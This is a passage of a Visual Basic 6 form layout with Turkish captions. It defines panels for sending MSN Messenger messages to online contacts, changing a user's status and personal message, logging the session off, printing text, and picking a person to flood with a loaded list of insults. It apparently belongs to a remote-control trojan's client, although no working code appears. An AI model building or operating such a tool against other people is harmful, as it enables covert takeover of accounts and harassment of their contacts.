            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":18132
         PICN            =   "Form1.frx":1844C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Shape shp 
         Height          =   735
         Index           =   15
         Left            =   5280
         Top             =   480
         Width           =   1335
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   "Boyut :"
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   56
         Left            =   240
         TabIndex        =   310
         Top             =   720
         Width           =   525
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Yazdýrýlacak Metin "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   55
         Left            =   240
         TabIndex        =   307
         Top             =   1320
         Width           =   1350
      End
      Begin VB.Shape shp 
         Height          =   3615
         Index           =   14
         Left            =   120
         Top             =   1440
         Width           =   6495
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Metin Ayarlarý "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   54
         Left            =   240
         TabIndex        =   305
         Top             =   360
         Width           =   1080
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Yazýcýdan Çýktý Al"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   53
         Left            =   0
         TabIndex        =   306
         Top             =   0
         Width           =   6735
      End
      Begin VB.Shape shp 
         Height          =   735
         Index           =   12
         Left            =   120
         Top             =   480
         Width           =   5055
      End
   End
   Begin VB.FileListBox lngfiles 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   10080
      TabIndex        =   296
      Top             =   120
      Width           =   1215
   End
   Begin VB.ComboBox Language 
      BackColor       =   &H00000000&
      ForeColor       =   &H00FFFFFF&
      Height          =   315
      Left            =   1200
      MousePointer    =   99  'Custom
      Style           =   2  'Dropdown List
      TabIndex        =   295
      Top             =   510
      Width           =   1335
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   19
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   283
      Top             =   6480
      Width           =   6735
      Begin VB.ComboBox kimeedicen 
         Height          =   315
         Left            =   240
         Style           =   2  'Dropdown List
         TabIndex        =   292
         Top             =   720
         Width           =   5055
      End
      Begin VB.ListBox lstkufur 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3405
         ItemData        =   "Form1.frx":1879E
         Left            =   240
         List            =   "Form1.frx":18856
         Style           =   1  'Checkbox
         TabIndex        =   286
         Top             =   1560
         Width           =   5655
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   122
         Left            =   5400
         TabIndex        =   287
         ToolTipText     =   "Online Kiþileri Al"
         Top             =   600
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":19123
         PICN            =   "Form1.frx":1943D
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   123
         Left            =   6000
         TabIndex        =   288
         ToolTipText     =   "Küfürleri Saydýr"
         Top             =   600
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1987F
         PICN            =   "Form1.frx":19B99
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   124
         Left            =   6000
         TabIndex        =   289
         ToolTipText     =   "dosyadan küfür yükle"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":19FDB
         PICN            =   "Form1.frx":1A2F5
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   125
         Left            =   6000
         TabIndex        =   290
         ToolTipText     =   "tümünü iþaretle"
         Top             =   2160
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1A647
         PICN            =   "Form1.frx":1A961
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   126
         Left            =   6000
         TabIndex        =   293
         ToolTipText     =   "tümünün iþaretini kaldir"
         Top             =   2760
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1ADA3
         PICN            =   "Form1.frx":1B0BD
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   127
         Left            =   6000
         TabIndex        =   294
         ToolTipText     =   "küfür listesini temizle"
         Top             =   3360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":1B4FF
         PICN            =   "Form1.frx":1B819
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Küfür Edilecek Kiþiyi Seçiniz "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   46
         Left            =   240
         TabIndex        =   291
         Top             =   360
         Width           =   2010
      End
      Begin VB.Shape shp 
         Height          =   735
         Index           =   11
         Left            =   120
         Top             =   480
         Width           =   6495
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Msn Messenger Ayarlarý"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   49
         Left            =   0
         TabIndex        =   284
         Top             =   0
         Width           =   6735
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   "Saydýrýlacak Küfür Listesi"
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   48
         Left            =   240
         TabIndex        =   285
         Top             =   1320
         Width           =   1755
      End
      Begin VB.Shape shp 
         Height          =   3615
         Index           =   13
         Left            =   120
         Top             =   1440
         Width           =   6495
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   18
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   266
      Top             =   6120
      Width           =   6735
      Begin VB.TextBox msngrileti 
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   3
         Left            =   240
         TabIndex        =   272
         Top             =   2520
         Width           =   5655
      End
      Begin VB.TextBox msngrileti 
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   2
         Left            =   240
         TabIndex        =   269
         Top             =   720
         Width           =   5655
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   112
         Left            =   6000
         TabIndex        =   267
         ToolTipText     =   "kiþisel iletisini al"
         Top             =   600
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1BC5B
         PICN            =   "Form1.frx":1BF75
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   113
         Left            =   6000
         TabIndex        =   271
         ToolTipText     =   "kiþisel iletisini ayarla"
         Top             =   2400
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1C3FF
         PICN            =   "Form1.frx":1C719
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   735
         Index           =   114
         Left            =   240
         TabIndex        =   274
         ToolTipText     =   "çevirim içi"
         Top             =   4200
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   1296
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1CB5B
         PICN            =   "Form1.frx":1CE75
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   735
         Index           =   115
         Left            =   1035
         TabIndex        =   276
         ToolTipText     =   "meþgul"
         Top             =   4200
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   1296
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1D2B7
         PICN            =   "Form1.frx":1D5D1
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   735
         Index           =   116
         Left            =   1820
         TabIndex        =   277
         ToolTipText     =   "dýþarýda"
         Top             =   4200
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   1296
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1DAD3
         PICN            =   "Form1.frx":1DDED
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   735
         Index           =   117
         Left            =   2600
         TabIndex        =   278
         ToolTipText     =   "telefonda"
         Top             =   4200
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   1296
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1E2EF
         PICN            =   "Form1.frx":1E609
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   735
         Index           =   118
         Left            =   3390
         TabIndex        =   279
         ToolTipText     =   "hemen donecek"
         Top             =   4200
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   1296
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1EA03
         PICN            =   "Form1.frx":1ED1D
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   735
         Index           =   119
         Left            =   4185
         TabIndex        =   280
         ToolTipText     =   "yemekte"
         Top             =   4200
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   1296
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1F16B
         PICN            =   "Form1.frx":1F485
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   735
         Index           =   120
         Left            =   4965
         TabIndex        =   281
         ToolTipText     =   "cevirimdisi goster"
         Top             =   4200
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   1296
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1F917
         PICN            =   "Form1.frx":1FC31
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   735
         Index           =   121
         Left            =   5760
         TabIndex        =   282
         ToolTipText     =   "oturumu kapat"
         Top             =   4200
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   1296
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1FFB3
         PICN            =   "Form1.frx":202CD
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Durumunu Deðiþtir "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   45
         Left            =   240
         TabIndex        =   275
         Top             =   3960
         Width           =   1410
      End
      Begin VB.Shape shp 
         Height          =   975
         Index           =   10
         Left            =   120
         Top             =   4080
         Width           =   6495
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Kiþisel Ýletisini Deðiþtir "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   42
         Left            =   240
         TabIndex        =   273
         Top             =   2160
         Width           =   1635
      End
      Begin VB.Shape shp 
         Height          =   735
         Index           =   9
         Left            =   120
         Top             =   2280
         Width           =   6495
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Kiþisel Ýletisini Öðren "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   41
         Left            =   240
         TabIndex        =   270
         Top             =   360
         Width           =   1545
      End
      Begin VB.Shape shp 
         Height          =   735
         Index           =   6
         Left            =   120
         Top             =   480
         Width           =   6495
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Msn Messenger Ayarlarý"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   43
         Left            =   0
         TabIndex        =   268
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   17
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   257
      Top             =   5760
      Width           =   6735
      Begin VB.TextBox msngrileti 
         Appearance      =   0  'Flat
         Height          =   1965
         Index           =   1
         Left            =   240
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   262
         Text            =   "Form1.frx":2067F
         Top             =   3000
         Width           =   6255
      End
      Begin VB.TextBox msngrileti 
         Appearance      =   0  'Flat
         Enabled         =   0   'False
         Height          =   285
         Index           =   0
         Left            =   240
         TabIndex        =   261
         Top             =   2280
         Width           =   6255
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   110
         Left            =   6120
         TabIndex        =   258
         ToolTipText     =   "online kiþi listesini al"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":206A4
         PICN            =   "Form1.frx":209BE
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSComctlLib.ListView lvw 
         Height          =   1575
         Index           =   9
         Left            =   120
         TabIndex        =   259
         Top             =   360
         Width           =   5895
         _ExtentX        =   10398
         _ExtentY        =   2778
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "imlist"
         SmallIcons      =   "imlist"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         MousePointer    =   99
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   1
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Online Kiþiler"
            Object.Width           =   9525
         EndProperty
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   111
         Left            =   6120
         TabIndex        =   265
         ToolTipText     =   "iletiyi gönder"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":20D10
         PICN            =   "Form1.frx":2102A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Ýletiyi Alacak Adres "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   39
         Left            =   240
         TabIndex        =   263
         Top             =   2040
         Width           =   1455
      End
      Begin VB.Shape shp 
         Height          =   495
         Index           =   5
         Left            =   120
         Top             =   2160
         Width           =   6495
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Anlýk Ýleti "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   40
         Left            =   240
         TabIndex        =   264
         Top             =   2760
         Width           =   735
      End
      Begin VB.Shape shp 
         Height          =   2175
         Index           =   1
         Left            =   120
         Top             =   2880
         Width           =   6495
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Msn Messenger Kiþilerine Anlýk Ýleti Gönder"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
